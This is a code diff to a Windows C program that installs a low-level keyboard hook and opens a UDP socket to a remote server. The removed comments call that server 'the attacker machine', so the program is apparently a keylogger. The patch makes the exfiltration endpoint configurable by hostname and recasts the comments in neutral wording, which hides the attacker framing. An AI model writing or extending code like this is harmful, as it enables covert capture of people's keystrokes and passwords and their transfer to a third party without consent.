@@ -9,9 +9,9 @@
 
 #define WM_APP_KEYDATA (WM_APP + 1)
 
-// following values are supposed to be changed
-#define SERVER_IP "127.0.0.1" // ip of the attacker machine
-#define SERVER_PORT 1025 // port number which is open to receive on attcker machine
+// Change the following values to your server's hostname and port.
+#define SERVER_HOSTNAME "localhost"   // Hostname (domain name) of the receiving server
+#define SERVER_PORT 1025              // Port number on the receiving server
 
 // function declaration
 LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
@@ -36,7 +36,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     dwMainThreadId = GetCurrentThreadId();
 
-
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
         fprintf(stderr, "Error: Failed to intialize winsock. Error code: %lu\n", GetLastError());
@@ -51,15 +50,28 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 
     struct sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(SERVER_PORT);
+    struct addrinfo *result = NULL, hints;
+    char portStr[6]; // Buffer to store port number as a string
 
-    if (inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr) <= 0) {
-        fprintf(stderr, "Error: Failed to covert ip from string to binary. Error code: %lu\n", GetLastError());
-        closesocket(sendSocket);
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_DGRAM;
+    hints.ai_protocol = IPPROTO_UDP;
+
+    // Convert port number to string, as getaddrinfo requires it
+    _snprintf_s(portStr, sizeof(portStr), _TRUNCATE, "%d", SERVER_PORT);
+
+    if (getaddrinfo(SERVER_HOSTNAME, portStr, &hints, &result) != 0) {
+        fprintf(stderr, "Error: getaddrinfo failed for hostname '%s'. Error code: %d\n", SERVER_HOSTNAME, WSAGetLastError());
         WSACleanup();
         return EXIT_FAILURE;
     }
+
+    // Copying the resolved address information into our serverAddr structure
+    memcpy(&serverAddr, result->ai_addr, sizeof(serverAddr));
+
+    // don't need it after this point so
+    freeaddrinfo(result);
 
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
     if (!keyboardHook) {
